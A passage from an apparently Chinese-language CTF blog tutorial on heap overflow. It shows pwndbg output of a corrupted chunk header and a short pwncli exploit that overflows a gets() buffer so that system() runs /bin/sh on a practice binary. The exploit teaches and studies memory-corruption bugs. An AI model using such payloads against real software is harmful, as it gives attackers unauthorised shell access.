+<p>我们知道用户通过<code>malloc</code>分配的内存是只使用<code>user_data</code>部分的，所以我们使用<code>gets</code>函数写入的数据是从<code>s</code>指针<code>chunk</code>的<code>uesr_data</code>部分开始写入，而<code>s</code>的<code>user_data</code>部分大小为<code>0x18</code>，即我们写入的数据溢出了<code>8</code>个字节覆盖了下一个<code>chunk</code>的<code>prev_size</code>字段和<code>size</code>字段。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b008</span><br>Size: <span class="hljs-number">0x190</span> (with flag bits: <span class="hljs-number">0x191</span>)<br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b198</span><br>Size: <span class="hljs-number">0x20</span> (with flag bits: <span class="hljs-number">0x21</span>)<br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x804b1b8</span><br>Size: <span class="hljs-number">0x61616160</span> (with flag bits: <span class="hljs-number">0x61616161</span>)<br></code></pre></td></tr></table></figure>
+
+<p>知道了堆溢出的原理后我们继续分析程序，程序在进行读取数据之后将<code>command</code>字段作为<code>system</code>函数参数执行。</p>
+<p>前面我们也知道了通过堆溢出我们可以将数据溢出到下一个<code>chunk</code>，即可以从<code>s</code>溢出到<code>command</code>。</p>
+<p>我们可以通过利用堆溢出从第一个堆块溢出到下一个堆块然后写入<code>/bin/sh\x00</code>字符串，之后由<code>system</code>函数执行获取shell。</p>
+<p>而<code>system</code>函数执行的内容同样也是<code>chunk</code>的<code>user_data</code>字段，所以我们必须得出溢出到<code>user_data</code>的填充大小。</p>
+<p>而前面我们已经知道了是<code>0x20</code>，所以接下来我们可以通过利用思路构造exp。</p>
+<ol start="3">
+<li>exp</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script()<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>pause()<br>s(payload)<br>ia()<br></code></pre></td></tr></table></figure>
+
+<h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><blockquote>
+<p>ctf-wiki</p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/10/28/pwn/heap/fastbin_att/">← Next fastbin attack</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/10/28/pwn/heap/uaf/">UAF Prev →</a></div></div></div><div id="comments"><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">南行</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/nanhang-950"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2122295973@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">基本示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%A0%86%E5%88%86%E9%85%8D%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">寻找堆分配函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">寻找危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6"><span class="toc-number">3.3.</span> <span class="toc-text">确定填充长度</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%A8%80"><span class="toc-number">5.</span> <span class="toc-text">后言</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
